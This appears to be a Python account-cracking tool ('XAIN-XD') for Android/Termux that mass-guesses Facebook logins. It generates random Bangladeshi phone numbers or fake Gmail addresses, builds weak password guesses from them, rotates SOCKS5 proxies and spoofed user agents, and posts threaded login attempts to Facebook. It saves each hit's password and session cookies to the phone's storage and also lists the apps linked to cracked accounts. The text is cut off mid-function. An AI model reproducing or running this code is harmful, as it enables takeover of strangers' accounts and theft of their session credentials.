import os,sys,uuid,re,random,time,string,json,urllib

try:
    import requests,rich
except:
    os.system("pip3 install requests rich")
    import requests,rich

from rich import print
from rich.tree import Tree
from rich.panel import Panel
from bs4 import BeautifulSoup
from io import BytesIO
import socket,ssl
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:
    os.listdir("/sdcard")
except:
    os.system("clear")
    sys.exit("\033[1;91m[\033[1;92m=\033[1;91m]\x1b[38;5;46m "+"Give Sto"+"rage "+"Pe"+"rmi"+"ssion")    
try:
    os.mkdir("/sdcard/XAIN XD")
except:
    pass

try:
    open('.prox.txt','w').write(requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text)
except requests.exceptions.ConnectionError:
    exit(' Network Is Too Slow ')
def prox():
    proxies = open('.prox.txt','r').read().splitlines()
    return {'http': 'socks5://'+random.choice(proxies)}
def check_apk(kukis):
    session = requests.Session()
    w=session.get("https://mbasic.prod.facebook.com/settings/apps/tabbed/?tab=active",cookies=kukis).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;37m \033[1;36m"+gm.replace('Added on',' [Added On]'))
    w=session.get("https://mbasic.prod.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=kukis).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;37m \033[1;33m"+gm.replace('Expired on',' [Expired On]'))    
 
#---------# Global
oks=[]
loop=0
user=[]
def cont(li):
    if li <10:
        return "0"+str(li)
    else:
        return str(li)
#---------# Date
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"\x1b[1;97m."+month.get(today_data[1])
#---------#Old Date
ugen=[]
ugen1=[]
BATMANapi=[]

def clear():os.system('clear');print(logo)
def space():
    print("\n")
def linex():
    print("[b][green]"+("━"*36)+"[/green][/b]")    
logo = """ 
[bold green]    __   __  ___  _____ _   _
[bold cyan]    \ \ / / / _ \|_   _| \ | |
[bold green]     \ V / / /_\ \ | | |  \| |    [bold red]BE Careful Bro
[bold cyan]     /   \ |  _  | | | | . ` | [bold green]Your System Cracked
[bold green]    / /^\ \| | | |_| |_| |\  |         [bold yellow]By
[bold cyan]    \/   \/\_| |_/\___/\_| \_/

[bold red]     Developer By [cyan]> Xain
[bold cyan]     TooL [cyan]        > [green]Paid
[bold green]     Version      [cyan]> [cyan]60.2            [bold reverse cyan] XAIN__[ XD ] """

def xain_co(oks):
    if str(len(oks))[-1] in ["0","2","4","6","8"]:
        return "[bright_red on bright_white][i] XAIN-XD [/i][/bright_red on bright_white]"
    else:
        return "[r bright_white][i] XAIN-XD [/i][/r bright_white]"
def savage_animi(loop):
     G="\033[38;5;118m"
     if str(loop)[-1] in ["1"]:
         return f"\033[1;1m{G}XAIN-XD\033[1;00m"
     elif str(loop)[-1] in ["2"]:
         return f"\033[1;1m\033[38;5;196mX{G}AIN-XD\033[1;00m"
     elif str(loop)[-1] in ["3"]:
         return f"\033[1;1m{G}X\033[38;5;196mA{G}IN-XD\033[1;00m"
     elif str(loop)[-1] in ["4"]:
         return f"\033[1;1m{G}XA\033[38;5;196mI{G}N-XD\033[1;00m"
     elif str(loop)[-1] in ["5"]:
         return f"\033[1;1m{G}X\033[38;5;196mAI{G}N-XD\033[1;00m"
     elif str(loop)[-1] in ["6"]:
         return f"\033[1;1m{G}XAI\033[38;5;196mN{G}-XD\033[1;00m"
     else:
         return f"\033[1;1m{G}XAIN-X\033[38;5;196mD{G}\033[1;00m"
def rd_color():
    return random.choice(["\033[1;30m","\033[1;33m","\033[1;34m","\033[1;35m","\033[38;5;44m","\033[38;5;20m","\033[38;5;198m"])
def animi(oks):
    if str(len(oks))[-1:] in ["2","4","6","8","0"]:
        return "[🤩][violet]⟩⟨[bright_green][🤩]"
    else:
        return "[😻][red1]⟨⟩[bright_green][😻]"
def animation_lop_lt(loop,tl):
    x="\033[1;37m"
    color=random.choice(["\033[1;30m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m"])
    con=str(loop)+"|"+tl
    text_len=len(con)
    indicator=random.choice(range(text_len))
    content=list(con)
    eliminate=content[indicator]
    content[indicator]=color+eliminate+"\033[1;37m"
    for xd in content:
        x+=xd
    return x
def spin_ani(loop):
    if str(loop)[-1]  in ["1","6"]:
        return "⠙"
    elif str(loop)[-1] in ["2","7"]:
        return "⠼"
    elif str(loop)[-1] in ["3","8"]:
        return "⠦"
    elif str(loop)[-1] in ["4","9"]:
        return "⠧"
    else:
        return "⠋"
def anibeket(ok):
    naw=str(len(ok))
    if naw[-1] in ["2","4","6","8","0"]:
        return "[violet] ⟩"
    else:
        return "[red1] ⟨"
        
def menu():
    clear()    
    space()
    print("[bold underline green]               Main Menu [✓]                   ")
    print("[bold red] [1] [green]>>   [italic]Random Clone ")
    print("[bold cyan] [2] [red]>>   [italic]Gmail Clone ")
    linex()
    ll=input("\033[1;31mChoice Option >> : ")
    if ll in ["1","01","A","a"]:
        rnd()
    elif ll in ["2","02","B","b"]:
        gml()
    else:
        clear()
        linex()
        space()
        print(" [bold red]    Please Enter Right Input")
        time.sleep(2)
        menu()
def rnd():
    clear()
    space()
    linex()
    print("[bold reverse green]Select BD Sim Code ")
    space()
    print(" 0177 / 0188 / 0199 / 0133 ")
    space()
    code=input("\033[1;31mEnter >> : ")
    clear()
    space()
    linex()
    space()
    bb=Tree(" [underline green]        Enter The Crack Limit         ")
    bb.add("[bold reverse cyan]20000 <=> 30000 <=> 50000 ").add("[bold green] Xain___XD ")
    print(bb)
    limit=int(input("\033[1;31m Input >>: "))
    for i in range(limit):
        heron=str(random.choice(range(1000000,9999999)))
        user.append(heron)
    clear()
    space()
    linex()
    print(f"[red1][[green1]=[red1]] METHOD  [red1][[green1]A[red1]]")
    print(f"[red1][[green1]=[red1]] METHOD  [red1][[green1]B[red1]]")
    print(f"[red1][[green1]=[red1]] METHOD  [red1][[green1]C[red1]]")
    linex()
    qw=input("\033[1;31mChoice Option >> : ")    
    with ThreadPool (max_workers=40) as xx:
        tl=str(len(user))
        clear()
        space()
        linex()
        print("[bold red] Sim Code ➦ [bold yellow]"+code)
        print(f"[bold cyan] Total Uid ➦ [bold green]"+tl)
        print("[bold green] TURN ON [yellow]/ [bold green]OFF AIRPLANE MODE EVERY 3 MIN")
        linex()
        for i in user:
            uid=code+i
            #pwx = [uid,i,uid[:8],uid[:7],uid[:6],'708090','203040','102030']
            pwx = [uid[:8],uid[:7],uid[:6],uid[5:],uid[3:],uid[4:],uid[2:]]            
            if qw in ["1"]:
                xx.submit(renmeth1,uid,pwx,tl,qw)
            elif qw in ["2"]:
                xx.submit(renmeth2,uid,pwx,tl,qw)
            elif qw in ["3"]:
                xx.submit(renmeth3,uid,pwx,tl,qw)
    linex()
    print(" [>] Crack Complete")
    print(" [<] Total OK : "+str(len(oks)))
    linex()
def genarate_mail(limit,user):
    names=str(requests.get("https:"+"//ra"+"w.githubu"+"sercontent."+"com/TEAM-ELIT"+"E1/dat"+"abase/"+"main/n"+"a"+"me"+"z."+"txt").text).splitlines()
    for i in range(limit):
        first_name=random.choice(names)
        last_name=random.choice(['Chowdhury','Islam', 'Haque', 'Molla','Hasan', 'Hussain','Hossain' ,'Mondal', 'Khan', 'Ali', 'Ahamed', 'Mia', 'Islam', 'Miya', 'Ahmad', 'Rahman', 'Sharkar','Rohman',"gamer","ff","fflover","yt","official","boss","gaming","Gaming","Gamer","FF","FFlover","freefirelover","YT","999","king","streamer","ffking","Khan","Ahamed","Chowdhury","Roy","Talukdahar","Haque","Shaikh","Vai","Hossain","Hasan","Islam","xxx","pro","noob","hacker","Itz","Pro","Noob","Queen","queen","gaming","streamer","FF","ff","yt","YT","ffgirl","ffqueen","freefirelover","ffyt","gamer","islam","Jahan","Moni","Chowdhury","Khan","Roy","Ahamed"])
        main_name=first_name.capitalize()+' '+last_name
        emailz=str(first_name.lower()+last_name.lower()+str(random.randint(1,1000))+"@gmail.com").replace(" ","")
        user.append(emailz+"|"+main_name)    
def gml():
    clear()
    space()
    linex()
    bb=Tree(" [underline green]        Enter The Crack Limit         ")
    bb.add("[bold reverse cyan]20000 <=> 30000 <=> 50000 ").add("[bold green] Xain___XD ")
    print(bb)
    limit=int(input("\033[1;31m Input >>: "))
    genarate_mail(limit,user)
    clear()
    space()
    linex()
    print(f"[red1][[green1]=[red1]] METHOD  [red1][[green1]A[red1]]")
    print(f"[red1][[green1]=[red1]] METHOD  [red1][[green1]B[red1]]")
    print(f"[red1][[green1]=[red1]] METHOD  [red1][[green1]C[red1]]")
    linex()
    qw=input("\033[1;31mChoice Option >> : ")    
    with ThreadPool (max_workers=30) as xx:
        tl=str(len(user))
        clear()
        space()
        linex()
        print(f"[bold cyan] Total Uid ➦ [bold green]"+tl)
        print("[bold green] TURN ON [yellow]/ [bold green]OFF AIRPLANE MODE EVERY 3 MIN")
        linex()
        for xd in user:
            uid,names = xd.split('|')
            first_name = names.rsplit(' ')[0]
            try: 
                last_name = names.rsplit(' ')[1]
            except IndexError:
                last_name = 'Gamer'
            fs = first_name.lower()
            ls = last_name.lower()
            pwx = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs+'@@',fs+'@@@@']
          #  pwx = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs+'112233',fs+'143',fs,fs+'1234',fs+'@#',fs+'12',fs+'@',fs+'@123',fs+'@#123',fs+'@@',fs+'@@@',fs+'@@@@',fs+'@12',fs+'@123',fs+'@1234',fs+'@12345','@'+fs+'@']
            if qw in ["1"]:
                xx.submit(renmeth1,uid,pwx,tl,qw)
            elif qw in ["2"]:
                xx.submit(renmeth2,uid,pwx,tl,qw)
            elif qw in ["3"]:
                xx.submit(renmeth3,uid,pwx,tl,qw)
    linex()
    print(" [>] Crack Complete")
    print(" [<] Total OK : "+str(len(oks)))
    linex()

def renmeth1(uid,pwx,tl,qw):
    global oks,loop,cpc
    sys.stdout.write(f'\r  \033[1;37m{spin_ani(loop)}\033[38;5;93m[{savage_animi(loop)}\033[38;5;93m]~\033[1;37m[\033[1;30mM\033[1;30m{qw}\033[1;37m]~\033[38;5;93m[\033[1;1m{animation_lop_lt(loop,tl)}\033[1;00m\033[38;5;93m]~[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[38;5;93m]\033[0;00m\r');sys.stdout.flush()        
    for ps in pwx:
        try:
            session=requests.session()
            uai = random.choice(["Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; BUZZ 3 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/364.0.0.14.77;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/372.0.0.15.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/371.0.0.10.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]","Mozilla/5.0 (Linux; Android 10; Z30 pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; Primo HM6 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 13; Nokia C32 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; AE9950 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; itel A14 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/374.0.0.10.114;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/375.0.0.7.111;]","Mozilla/5.0 (Linux; Android 10; Symphony Atom ii Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; F10XIPSQ Build/0929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 12; Sparx Neo 7 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/368.0.0.5.95;]","Mozilla/5.0 (Linux; Android 8.1.0; C11_Pro Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 8.1.0; itel W6001 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/370.0.0.16.116;]","Mozilla/5.0 (Linux; Android 8.1.0; BUZZ 1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/367.0.0.7.52;]","Mozilla/5.0 (Linux; Android 9; LH9920 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 9.0; X109 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/376.0.0.7.103;]"])
            uai2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; BUZZ 3 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/364.0.0.14.77;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/372.0.0.15.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/371.0.0.10.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]","Mozilla/5.0 (Linux; Android 10; Z30 pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; Primo HM6 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 13; Nokia C32 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; AE9950 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; itel A14 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/374.0.0.10.114;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/375.0.0.7.111;]","Mozilla/5.0 (Linux; Android 10; Symphony Atom ii Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; F10XIPSQ Build/0929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 12; Sparx Neo 7 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/368.0.0.5.95;]","Mozilla/5.0 (Linux; Android 8.1.0; C11_Pro Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 8.1.0; itel W6001 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/370.0.0.16.116;]","Mozilla/5.0 (Linux; Android 8.1.0; BUZZ 1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/367.0.0.7.52;]","Mozilla/5.0 (Linux; Android 9; LH9920 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 9.0; X109 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/376.0.0.7.103;]"])
            session.headers.update({"Host": "m.facebook.com","upgrade-insecure-requests":"1","user-agent":f"{uai}","accept":"*/*","dnt":"1","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
            get_method = session.get(f"https://p.facebook.com/").text
            date = {'lsd': re.search('name="lsd" value="(.*?)"',str(get_method)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(get_method)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(get_method)).group(1), 'li': re.search('name="li" value="(.*?)"',str(get_method)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'pass': ps, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(get_method)).group(1)}
            head = ({"Host": "m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com/","content-type":"application/x-www-form-urlencoded","user-agent":f"{uai2}","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"?1","sec-fetch-dest":"empty","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
            post_method = session.post(f"https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=date, headers=head)
            if "c_user" in session.cookies.get_dict():
                kukis=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=kukis.split("c_user=")[1]
                uid=xx[:15].replace(";","  ")
              #  ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                #res = requests.get(ckk).text
               # if 'Photoshop' in res:
                oks.append(uid)
                print(f"\r\r[b]"+xain_co(oks)+f" [bright_green]{uid} [orange3]▶ [bright_green]{ps}               \n{animi(oks)}sb=cracked_by.Xain-xd:tool;"+kukis.replace("-1","1")+"\n")
                open("/sdcard/XAIN XD/XAIN-OK.txt","a").write(uid+"|"+ps+"|"+kukis+"\n")
                break            
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1    
    
    
def renmeth2(uid,pwx,tl,qw):
    global oks,loop,cpc
    sys.stdout.write(f'\r  \033[1;37m{spin_ani(loop)}\033[38;5;93m[{savage_animi(loop)}\033[38;5;93m]~\033[1;37m[\033[1;30mM\033[1;30m{qw}\033[1;37m]~\033[38;5;93m[\033[1;1m{animation_lop_lt(loop,tl)}\033[1;00m\033[38;5;93m]~[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[38;5;93m]\033[0;00m\r');sys.stdout.flush()        
    for ps in pwx:
        try:
            session=requests.session()
